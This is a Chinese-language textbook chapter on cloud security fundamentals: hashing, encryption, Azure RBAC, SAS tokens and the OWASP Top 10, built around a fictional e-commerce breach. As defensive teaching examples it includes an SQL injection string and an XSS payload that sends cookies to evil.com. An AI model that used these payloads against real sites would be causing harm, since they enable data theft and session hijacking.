# 第 8 章：數位堡壘 (The Digital Fortress)

> 「安全不是產品，是過程。」
> —— Bruce Schneier，資安專家

---

## 本章學習目標

完成本章後，你將能夠：

- 區分雜湊（Hashing）和加密（Encryption）的用途
- 理解對稱式和非對稱式加密的差異
- 設計 RBAC（角色型存取控制）權限架構
- 使用 SAS（共享存取簽章）控制資源存取
- 識別並防禦 OWASP Top 10 安全威脅
- 在 Azure 上實作安全最佳實踐

---

## 8.1 資料外洩事件：安全的代價

2024 年初，CloudMart 收到一封令人不安的電子郵件：

> 「我們擁有你們 50 萬會員的資料。如果不支付比特幣，我們將公開這些資料。」

技術團隊緊急調查，發現：

```
┌─────────────────────────────────────────────────────────────────┐
│                    資安事件調查報告                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  攻擊向量：SQL Injection（SQL 注入攻擊）                        │
│                                                                 │
│  攻擊過程：                                                      │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  1. 攻擊者在搜尋欄位輸入惡意字串                           │ │
│  │     ' OR '1'='1' --                                       │ │
│  │                                                           │ │
│  │  2. 後端程式碼未正確處理，直接拼接 SQL                     │ │
│  │     SELECT * FROM users WHERE name = '' OR '1'='1' --'    │ │
│  │                                                           │ │
│  │  3. 攻擊者取得所有用戶資料                                 │ │
│  │                                                           │ │
│  │  4. 進一步利用取得的管理員帳號登入後台                     │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
│  洩露資料：                                                      │
│  • 會員姓名、Email、電話                                        │
│  • 部分信用卡末四碼                                             │
│  • 密碼雜湊值（幸好有加鹽）                                     │
│                                                                 │
│  根本原因：                                                      │
│  ✗ 未使用參數化查詢                                             │
│  ✗ 未實施輸入驗證                                               │
│  ✗ 資料庫權限過大                                               │
│  ✗ 缺乏 WAF 防護                                                │
│  ✗ 未加密敏感欄位                                               │
│                                                                 │
│  損失估計：                                                      │
│  • 罰款（GDPR / 個資法）：NT$ 5,000,000                        │
│  • 公關危機處理：NT$ 2,000,000                                  │
│  • 系統修復：NT$ 3,000,000                                      │
│  • 商譽損失：無法估計                                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

這個事件讓 CloudMart 痛下決心，全面強化資訊安全。

---

## 8.2 雜湊 vs. 加密：資料保護的兩種武器

### 8.2.1 雜湊（Hashing）

**雜湊**是一種單向函數，將任意長度的資料轉換為固定長度的「指紋」。

```
┌─────────────────────────────────────────────────────────────────┐
│                      雜湊函數特性                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  輸入 ──────► 雜湊函數 ──────► 輸出（固定長度）                  │
│                                                                 │
│  "Hello"        SHA-256      2cf24dba5fb0a30e26e83b2ac5b9e29e   │
│  "Hello!"       SHA-256      334d016f755cd6dc58c53a86e183882f   │
│  《戰爭與和平》  SHA-256      a3f2b5c8d9e0f1a2b3c4d5e6f7a8b9c0   │
│  (全文 60 萬字)                (還是 64 個字元)                  │
│                                                                 │
│  特性：                                                          │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  1. 單向性：無法從雜湊值還原原始資料                       │ │
│  │  2. 確定性：相同輸入永遠產生相同輸出                       │ │
│  │  3. 雪崩效應：輸入微小變化導致輸出巨大變化                 │ │
│  │  4. 抗碰撞：極難找到兩個不同輸入產生相同輸出               │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
│  常見雜湊演算法：                                                │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  演算法       輸出長度      安全性      用途               │ │
│  │  ─────────────────────────────────────────────────────── │ │
│  │  MD5          128 bits     ✗ 已破解   檔案校驗（非安全）  │ │
│  │  SHA-1        160 bits     ✗ 已破解   舊系統相容          │ │
│  │  SHA-256      256 bits     ✓ 安全     密碼、簽章          │ │
│  │  SHA-512      512 bits     ✓ 安全     高安全需求          │ │
│  │  bcrypt       varies       ✓ 安全     密碼儲存（推薦）    │ │
│  │  Argon2       varies       ✓ 安全     密碼儲存（最新）    │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 8.2.2 密碼儲存：加鹽雜湊

```
┌─────────────────────────────────────────────────────────────────┐
│                    密碼儲存最佳實踐                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  ✗ 錯誤做法 1：明文儲存                                         │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  user_id | password                                       │ │
│  │  ────────────────────                                     │ │
│  │  1001    | password123                                    │ │
│  │  1002    | iloveyou                                       │ │
│  │                                                           │ │
│  │  問題：資料庫洩露 = 所有密碼洩露                           │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
│  ✗ 錯誤做法 2：單純雜湊                                         │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  user_id | password_hash                                  │ │
│  │  ────────────────────                                     │ │
│  │  1001    | ef92b778bafe...（password123 的 SHA-256）      │ │
│  │  1002    | e4ad93ca07ac...（iloveyou 的 SHA-256）         │ │
│  │                                                           │ │
│  │  問題：可用彩虹表（預計算的雜湊對照表）破解常見密碼        │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
│  ✓ 正確做法：加鹽雜湊                                           │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  user_id | salt              | password_hash              │ │
│  │  ─────────────────────────────────────────────────────── │ │
│  │  1001    | x7k9m2p5q8...    | 3f8b2c1d9e...               │ │
│  │  1002    | a3b5c7d9e1...    | 7d4e2f1a8b...               │ │
│  │                                                           │ │
│  │  hash = SHA256(salt + password)                           │ │
│  │                                                           │ │
│  │  即使兩個用戶使用相同密碼，因為 salt 不同，                │ │
│  │  產生的 hash 也不同，無法使用彩虹表攻擊                    │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
│  ✓✓ 最佳做法：使用專門的密碼雜湊演算法                          │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  // 使用 bcrypt（Node.js 範例）                           │ │
│  │  const bcrypt = require('bcrypt');                        │ │
│  │                                                           │ │
│  │  // 雜湊密碼                                               │ │
│  │  const hash = await bcrypt.hash(password, 12);            │ │
│  │  // 12 是 cost factor，決定運算複雜度                      │ │
│  │                                                           │ │
│  │  // 驗證密碼                                               │ │
│  │  const isValid = await bcrypt.compare(password, hash);    │ │
│  │                                                           │ │
│  │  優點：                                                    │ │
│  │  • 自動加鹽                                                │ │
│  │  • 可調整的運算成本（對抗 GPU 暴力破解）                   │ │
│  │  • 時間複雜度高，攻擊成本高                                │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 8.2.3 加密（Encryption）

**加密**是可逆的資料轉換，可以用金鑰還原原始資料。

```
┌─────────────────────────────────────────────────────────────────┐
│                    對稱式 vs. 非對稱式加密                       │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  對稱式加密（Symmetric Encryption）                              │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │                                                           │ │
│  │  發送方                                   接收方          │ │
│  │                                                           │ │
│  │  明文 ──► [加密] ──► 密文 ──► [解密] ──► 明文            │ │
│  │             │                   │                         │ │
│  │             └───── 相同金鑰 ────┘                         │ │
│  │                                                           │ │
│  │  演算法：AES-256, ChaCha20                                │ │
│  │  優點：速度快                                              │ │
│  │  缺點：金鑰分發困難（如何安全地共享金鑰？）                │ │
│  │  用途：大量資料加密、資料庫加密                            │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
│  非對稱式加密（Asymmetric Encryption）                           │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │                                                           │ │
│  │  發送方                                   接收方          │ │
│  │                                                           │ │
│  │  明文 ──► [加密] ──► 密文 ──► [解密] ──► 明文            │ │
│  │             │                   │                         │ │
│  │          公開金鑰            私密金鑰                     │ │
│  │         (Public)            (Private)                     │ │
│  │                                                           │ │
│  │  公開金鑰：可以公開分享，用於加密                          │ │
│  │  私密金鑰：必須保密，用於解密                              │ │
│  │                                                           │ │
│  │  演算法：RSA, ECDSA                                       │ │
│  │  優點：解決金鑰分發問題                                    │ │
│  │  缺點：速度慢（比對稱式慢 100-1000 倍）                    │ │
│  │  用途：TLS 握手、數位簽章、金鑰交換                        │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
│  實際應用：混合加密                                              │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │                                                           │ │
│  │  1. 使用非對稱加密交換對稱金鑰（安全的金鑰分發）          │ │
│  │  2. 使用對稱金鑰加密實際資料（高效率）                    │ │
│  │                                                           │ │
│  │  這就是 TLS/HTTPS 的運作方式                              │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 8.2.4 雜湊 vs. 加密：選擇指南

| 場景 | 使用雜湊 | 使用加密 |
|------|---------|---------|
| 密碼儲存 | ✓ | ✗ |
| 資料完整性驗證 | ✓ | ✗ |
| 數位簽章 | ✓ | ✗ |
| 敏感資料儲存（信用卡） | ✗ | ✓ |
| 通訊加密 | ✗ | ✓ |
| 備份加密 | ✗ | ✓ |

---

## 8.3 RBAC：角色型存取控制

### 8.3.1 什麼是 RBAC？

**RBAC（Role-Based Access Control）** 是一種存取控制模型，根據使用者的「角色」來決定他們可以做什麼。

```
┌─────────────────────────────────────────────────────────────────┐
│                      RBAC 概念                                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  傳統方式（直接授權）                                            │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │                                                           │ │
│  │  用戶 A ──► 權限 1, 權限 2, 權限 3                        │ │
│  │  用戶 B ──► 權限 1, 權限 2, 權限 4                        │ │
│  │  用戶 C ──► 權限 2, 權限 3, 權限 4                        │ │
│  │  ...                                                      │ │
│  │  用戶 1000 ──► 權限 1, 權限 2, 權限 3                     │ │
│  │                                                           │ │
│  │  問題：                                                    │ │
│  │  • 難以管理（用戶多時）                                    │ │
│  │  • 不一致性（容易遺漏）                                    │ │
│  │  • 難以審計                                                │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
│  RBAC 方式                                                       │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │                                                           │ │
│  │  用戶 A ─┐                    ┌── 權限 1                  │ │
│  │  用戶 B ─┼──► 角色：管理員 ───┼── 權限 2                  │ │
│  │  用戶 C ─┘                    └── 權限 3                  │ │
│  │                                                           │ │
│  │  用戶 D ─┐                    ┌── 權限 4                  │ │
│  │  用戶 E ─┼──► 角色：客服 ─────┼── 權限 5                  │ │
│  │  用戶 F ─┘                    └── 權限 6                  │ │
│  │                                                           │ │
│  │  優點：                                                    │ │
│  │  • 集中管理（只需管理角色）                                │ │
│  │  • 一致性（同角色同權限）                                  │ │
│  │  • 易於審計                                                │ │
│  │  • 符合最小權限原則                                        │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 8.3.2 CloudMart RBAC 設計

```
┌─────────────────────────────────────────────────────────────────┐
│                CloudMart 權限矩陣                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  資源 \ 角色    │ 超級管理員 │ 店長  │ 客服  │ 倉管  │ 訪客   │
│  ───────────────────────────────────────────────────────────── │
│  用戶管理       │    CRUD    │  R    │  R    │  -    │  -    │
│  商品管理       │    CRUD    │ CRUD  │  R    │  R    │  R    │
│  訂單管理       │    CRUD    │ CRUD  │  RU   │  R    │  -    │
│  庫存管理       │    CRUD    │  RU   │  -    │ CRUD  │  -    │
│  報表查看       │    CRUD    │  R    │  -    │  R    │  -    │
│  系統設定       │    CRUD    │  -    │  -    │  -    │  -    │
│  客服對話       │    CRUD    │  R    │ CRUD  │  -    │  -    │
│                                                                 │
│  C = Create（建立）                                              │
│  R = Read（讀取）                                                │
│  U = Update（更新）                                              │
│  D = Delete（刪除）                                              │
│  - = 無權限                                                      │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 8.3.3 Azure RBAC

Azure 內建了強大的 RBAC 系統，用於控制對 Azure 資源的存取。

```
┌─────────────────────────────────────────────────────────────────┐
│                   Azure RBAC 架構                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  安全性主體（Who）                                               │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  • 用戶（User）                                            │ │
│  │  • 群組（Group）                                           │ │
│  │  • 服務主體（Service Principal）                           │ │
│  │  • 受控識別（Managed Identity）                            │ │
│  └───────────────────────────────────────────────────────────┘ │
│                         │                                       │
│                         ▼                                       │
│  角色定義（What）                                                │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  內建角色：                                                │ │
│  │  • Owner：完全控制，包括授權他人                           │ │
│  │  • Contributor：可建立和管理資源，但不能授權              │ │
│  │  • Reader：只能查看資源                                    │ │
│  │  • 特定服務角色（如 Storage Blob Data Contributor）       │ │
│  │                                                           │ │
│  │  自訂角色：                                                │ │
│  │  • 根據需求自訂權限組合                                    │ │
│  └───────────────────────────────────────────────────────────┘ │
│                         │                                       │
│                         ▼                                       │
│  範圍（Where）                                                   │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │                                                           │ │
│  │        管理群組（Management Group）                        │ │
│  │              │                                            │ │
│  │              ▼                                            │ │
│  │        訂用帳戶（Subscription）                            │ │
│  │              │                                            │ │
│  │              ▼                                            │ │
│  │        資源群組（Resource Group）                          │ │
│  │              │                                            │ │
│  │              ▼                                            │ │
│  │           資源（Resource）                                 │ │
│  │                                                           │ │
│  │  權限會向下繼承：在訂用帳戶層級授權，                      │ │
│  │  則該訂用帳戶下所有資源群組和資源都會繼承該權限            │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

```bash
# Azure CLI 角色指派範例

# 列出內建角色
az role definition list --query "[].{name:name, description:description}" -o table

# 指派角色給用戶
az role assignment create \
    --assignee user@cloudmart.com \
    --role "Contributor" \
    --scope /subscriptions/{subscription-id}/resourceGroups/CloudMart-Production

# 指派角色給服務主體
az role assignment create \
    --assignee {service-principal-id} \
    --role "Storage Blob Data Contributor" \
    --scope /subscriptions/{subscription-id}/resourceGroups/CloudMart-Production/providers/Microsoft.Storage/storageAccounts/cloudmartstorage

# 列出角色指派
az role assignment list --scope /subscriptions/{subscription-id}/resourceGroups/CloudMart-Production
```

---

## 8.4 SAS：共享存取簽章

### 8.4.1 什麼是 SAS？

**SAS（Shared Access Signature）** 是 Azure Storage 的安全機制，可以提供對儲存資源的限時、限權存取，而不需要暴露帳戶金鑰。

```
┌─────────────────────────────────────────────────────────────────┐
│                     SAS 工作原理                                 │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  傳統方式（共享帳戶金鑰）                                        │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │                                                           │ │
│  │  用戶 ──► 帳戶金鑰 ──► Storage Account                    │ │
│  │                                                           │ │
│  │  問題：                                                    │ │
│  │  • 金鑰洩露 = 完全失控                                     │ │
│  │  • 無法限制權限範圍                                        │ │
│  │  • 無法設定過期時間                                        │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
│  SAS 方式                                                        │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │                                                           │ │
│  │  伺服器                                                    │ │
│  │    │                                                      │ │
│  │    │ 1. 生成 SAS Token                                    │ │
│  │    │    ┌─────────────────────────────────────────────┐   │ │
│  │    │    │ • 允許的服務：Blob                          │   │ │
│  │    │    │ • 允許的操作：Read                          │   │ │
│  │    │    │ • 允許的資源：/images/product-001.jpg      │   │ │
│  │    │    │ • 開始時間：2024-01-15T00:00:00Z           │   │ │
│  │    │    │ • 結束時間：2024-01-15T01:00:00Z（1小時後）│   │ │
│  │    │    │ • 允許的 IP：203.0.113.0/24                │   │ │
│  │    │    │ • 簽名：base64(HMAC-SHA256(...))           │   │ │
│  │    │    └─────────────────────────────────────────────┘   │ │
│  │    │                                                      │ │
│  │    ▼                                                      │ │
│  │  2. 回傳 SAS URL 給用戶                                   │ │
│  │                                                           │ │
│  │  用戶                                                      │ │
│  │    │                                                      │ │
│  │    │ 3. 使用 SAS URL 直接存取 Storage                     │ │
│  │    │                                                      │ │
│  │    ▼                                                      │ │
│  │  Azure Storage                                            │ │
│  │    │                                                      │ │
│  │    │ 4. 驗證簽名、檢查權限和時間                          │ │
│  │    │                                                      │ │
│  │    ▼                                                      │ │
│  │  5. 回傳資源（或拒絕存取）                                │ │
│  │                                                           │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 8.4.2 SAS 類型

| 類型 | 說明 | 用途 |
|------|------|------|
| **服務 SAS** | 存取單一服務的特定資源 | 讓用戶上傳商品圖片 |
| **帳戶 SAS** | 存取多個服務和資源 | 管理員批次操作 |
| **用戶委派 SAS** | 使用 Azure AD 認證簽署 | 最安全，建議使用 |

### 8.4.3 生成 SAS 範例

```javascript
// Node.js 生成 SAS Token
const { BlobServiceClient, generateBlobSASQueryParameters, BlobSASPermissions } = require("@azure/storage-blob");

async function generateUploadSasUrl(containerName, blobName, expiresInMinutes = 30) {
    const accountName = process.env.STORAGE_ACCOUNT_NAME;
    const accountKey = process.env.STORAGE_ACCOUNT_KEY;

    // 設定 SAS 參數
    const sasOptions = {
        containerName,
        blobName,
        permissions: BlobSASPermissions.parse("cw"),  // Create + Write
        startsOn: new Date(),
        expiresOn: new Date(Date.now() + expiresInMinutes * 60 * 1000),
        contentType: "image/jpeg",
        protocol: "https"
    };

    // 生成 SAS Token
    const sharedKeyCredential = new StorageSharedKeyCredential(accountName, accountKey);
    const sasToken = generateBlobSASQueryParameters(sasOptions, sharedKeyCredential).toString();

    // 組合完整 URL
    const sasUrl = `https://${accountName}.blob.core.windows.net/${containerName}/${blobName}?${sasToken}`;

    return sasUrl;
}

// 使用範例：讓用戶上傳商品圖片
async function getProductImageUploadUrl(productId) {
    const blobName = `products/${productId}/image-${Date.now()}.jpg`;
    const sasUrl = await generateUploadSasUrl("images", blobName, 15);

    return {
        uploadUrl: sasUrl,
        blobName,
        expiresAt: new Date(Date.now() + 15 * 60 * 1000)
    };
}
```

---

## 8.5 OWASP Top 10：常見安全威脅

### 8.5.1 OWASP Top 10 概覽

**OWASP（Open Web Application Security Project）** 每幾年發布一次 Web 應用程式最嚴重的安全風險清單。

```
┌─────────────────────────────────────────────────────────────────┐
│                  OWASP Top 10 (2021)                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  A01: Broken Access Control（存取控制失效）                      │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  問題：用戶可以存取未授權的資源                            │ │
│  │  範例：直接存取 /admin 頁面、修改 URL 中的用戶 ID          │ │
│  │  防禦：實施最小權限原則、伺服器端驗證                      │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
│  A02: Cryptographic Failures（加密失敗）                         │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  問題：敏感資料未正確加密                                  │ │
│  │  範例：明文儲存密碼、使用弱加密演算法                      │ │
│  │  防禦：使用強加密、正確管理金鑰                            │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
│  A03: Injection（注入攻擊）                                      │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  問題：惡意資料被當作指令執行                              │ │
│  │  範例：SQL Injection、Command Injection                    │ │
│  │  防禦：參數化查詢、輸入驗證、轉義                          │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
│  A04: Insecure Design（不安全的設計）                            │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  問題：架構設計本身存在安全缺陷                            │ │
│  │  範例：缺乏防禦深度、未考慮威脅模型                        │ │
│  │  防禦：安全設計審查、威脅建模                              │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
│  A05: Security Misconfiguration（安全設定錯誤）                  │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  問題：使用預設密碼、暴露錯誤訊息                          │ │
│  │  範例：保留預設管理員帳號、顯示堆疊追蹤                    │ │
│  │  防禦：安全基準配置、自動化掃描                            │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
│  A06: Vulnerable Components（使用有漏洞的元件）                  │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  問題：使用有已知漏洞的第三方套件                          │ │
│  │  範例：過時的 jQuery、有漏洞的 npm 套件                    │ │
│  │  防禦：定期更新、使用 Dependabot                           │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
│  A07: Authentication Failures（身份驗證失敗）                    │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  問題：身份驗證機制薄弱                                    │ │
│  │  範例：允許弱密碼、無暴力破解保護                          │ │
│  │  防禦：MFA、帳號鎖定、安全的會話管理                       │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
│  A08: Software and Data Integrity Failures（完整性失敗）         │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  問題：未驗證軟體或資料的完整性                            │ │
│  │  範例：不安全的 CI/CD、未驗證的更新                        │ │
│  │  防禦：數位簽章、完整性檢查                                │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
│  A09: Security Logging Failures（日誌記錄失敗）                  │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  問題：缺乏安全事件的日誌記錄                              │ │
│  │  範例：登入失敗未記錄、無法追蹤攻擊                        │ │
│  │  防禦：完整的日誌記錄、即時監控告警                        │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
│  A10: SSRF（伺服器端請求偽造）                                   │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  問題：伺服器被利用來存取內部資源                          │ │
│  │  範例：透過 URL 參數存取 localhost 服務                    │ │
│  │  防禦：白名單驗證、網路隔離                                │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 8.5.2 SQL Injection 防禦

```javascript
// ✗ 危險：字串拼接
async function getUserByName_VULNERABLE(name) {
    const query = `SELECT * FROM users WHERE name = '${name}'`;
    // 攻擊者輸入：' OR '1'='1' --
    // 實際執行：SELECT * FROM users WHERE name = '' OR '1'='1' --'
    return await db.query(query);
}

// ✓ 安全：參數化查詢
async function getUserByName_SAFE(name) {
    const query = `SELECT * FROM users WHERE name = $1`;
    return await db.query(query, [name]);
    // 參數會被正確轉義，攻擊字串會被當作普通字串
}

// ✓ 安全：使用 ORM
async function getUserByName_ORM(name) {
    return await User.findOne({
        where: { name: name }
    });
}
```

### 8.5.3 XSS 防禦

```javascript
// ✗ 危險：直接插入用戶輸入
function displayComment_VULNERABLE(comment) {
    document.getElementById('comments').innerHTML = comment;
    // 攻擊者輸入：<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>
}

// ✓ 安全：HTML 編碼
function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function displayComment_SAFE(comment) {
    document.getElementById('comments').innerHTML = escapeHtml(comment);
    // <script> 會被轉為 &lt;script&gt;，不會被執行
}

// ✓ 更安全：使用 textContent
function displayComment_SAFEST(comment) {
    document.getElementById('comments').textContent = comment;
}

// ✓ 服務端：設定 CSP 標頭
// Content-Security-Policy: default-src 'self'; script-src 'self'
```

---

## 8.6 Azure 安全服務

```
┌─────────────────────────────────────────────────────────────────┐
│                  Azure 安全服務一覽                              │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  身份與存取管理                                                  │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  • Azure Active Directory：身份管理                        │ │
│  │  • Conditional Access：條件式存取                          │ │
│  │  • Privileged Identity Management：特權身份管理            │ │
│  │  • Multi-Factor Authentication：多因素驗證                 │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
│  網路安全                                                        │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  • Azure Firewall：企業級防火牆                            │ │
│  │  • Network Security Groups：網路安全群組                   │ │
│  │  • DDoS Protection：DDoS 防護                              │ │
│  │  • Web Application Firewall：Web 應用防火牆               │ │
│  │  • Azure Bastion：安全的 VM 存取                           │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
│  資料保護                                                        │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  • Azure Key Vault：密鑰和憑證管理                         │ │
│  │  • Storage Service Encryption：儲存加密                    │ │
│  │  • Azure Information Protection：資訊保護                  │ │
│  │  • Transparent Data Encryption：資料庫加密                 │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
│  威脅防護                                                        │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  • Microsoft Defender for Cloud：雲端安全中心              │ │
│  │  • Azure Sentinel：SIEM 解決方案                           │ │
│  │  • Microsoft Defender for Endpoint：端點防護               │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
│  合規性                                                          │
│  ┌───────────────────────────────────────────────────────────┐ │
│  │  • Azure Policy：策略合規                                  │ │
│  │  • Azure Blueprints：藍圖管理                              │ │
│  │  • Compliance Manager：合規管理                            │ │
│  └───────────────────────────────────────────────────────────┘ │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

---

## 8.7 章節總結

### 核心概念回顧

| 概念 | 說明 | 用途 |
|------|------|------|
| **雜湊** | 單向轉換，產生固定長度指紋 | 密碼儲存、完整性驗證 |
| **加密** | 可逆轉換，保護資料機密性 | 敏感資料儲存、通訊 |
| **RBAC** | 角色型存取控制 | 權限管理 |
| **SAS** | 共享存取簽章 | 臨時資源存取 |
| **OWASP Top 10** | 常見安全威脅 | 安全防禦指南 |

### AZ-900 考試重點

1. **Azure AD**：身份管理、MFA、條件式存取
2. **Azure Key Vault**：密鑰和憑證管理
3. **NSG vs. Azure Firewall**：知道各自適用場景
4. **責任分擔模型**：知道雲端供應商和客戶各負責什麼
5. **合規性**：知道 Azure 符合哪些合規標準

### 學習檢查清單

- [ ] 區分雜湊和加密的用途
- [ ] 設計 RBAC 權限架構
- [ ] 使用 SAS 控制資源存取
- [ ] 識別 OWASP Top 10 威脅
- [ ] 實作基本的安全防禦措施

---

## 8.8 結語：CloudMart 的安全之旅

經過全面的安全強化，CloudMart 建立了多層防禦體系：

```
┌─────────────────────────────────────────────────────────────────┐
│               CloudMart 安全防禦架構                             │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  邊界防護                                                        │
│  ├── Azure DDoS Protection                                      │
│  ├── Azure Front Door + WAF                                     │
│  └── Azure Firewall                                             │
│                                                                 │
│  網路分段                                                        │
│  ├── Virtual Network                                            │
│  ├── Network Security Groups                                    │
│  └── Private Endpoints                                          │
│                                                                 │
│  身份與存取                                                      │
│  ├── Azure AD + MFA                                             │
│  ├── RBAC                                                       │
│  └── Managed Identities                                         │
│                                                                 │
│  資料保護                                                        │
│  ├── 傳輸中加密 (TLS 1.3)                                       │
│  ├── 靜態加密 (AES-256)                                         │
│  └── Key Vault 管理金鑰                                         │
│                                                                 │
│  應用程式安全                                                    │
│  ├── 參數化查詢                                                 │
│  ├── 輸入驗證                                                   │
│  ├── CSP 標頭                                                   │
│  └── 安全的依賴管理                                             │
│                                                                 │
│  監控與回應                                                      │
│  ├── Microsoft Defender for Cloud                               │
│  ├── Azure Sentinel (SIEM)                                      │
│  └── 安全事件自動回應                                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

**從那次資安事件中學到的教訓：**

1. **安全是過程，不是狀態**——需要持續投入
2. **防禦要有深度**——多層防護，單點失效不致災
3. **最小權限原則**——只給需要的權限
4. **假設已被入侵**——做好偵測和回應準備
5. **人是最大的弱點**——安全意識培訓很重要

---

## 延伸閱讀

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [Azure 安全性文件](https://docs.microsoft.com/azure/security/)
- [NIST 網路安全框架](https://www.nist.gov/cyberframework)
- [Microsoft 安全最佳實踐](https://docs.microsoft.com/security/)

---

**上一章：[第 7 章：打造軟體工廠](./chapter-07.md)**

---

## 恭喜你完成了這本書！

你已經掌握了從基礎設施到安全的完整雲端知識。

現在，是時候去考取 AZ-900 認證，開始你的 Azure 之旅了！

祝你好運！🎉
